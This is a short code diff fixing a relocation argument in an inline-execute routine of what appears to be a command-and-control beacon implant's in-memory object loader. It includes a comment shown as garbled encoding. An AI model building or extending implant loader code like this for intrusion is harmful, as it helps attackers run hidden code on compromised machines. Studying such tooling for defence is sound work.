@@ -102,7 +102,7 @@ VOID CmdInlineExecute(unsigned char* command_buffer, size_t command_length) {
 			result = processRelocation(reloc, text, lpTextStartAddress, data, reloc->value);
 		}
 		else if (reloc->beaconRelocType.secType == EXE_RELOC_TYPE) {
-			result = processRelocation(reloc, text, lpTextStartAddress, text, reloc->value);
+			result = processRelocation(reloc, text, lpTextStartAddress, lpTextStartAddress, reloc->value);
 		}
 		else {
 			// ÄÚ²¿º¯Êý
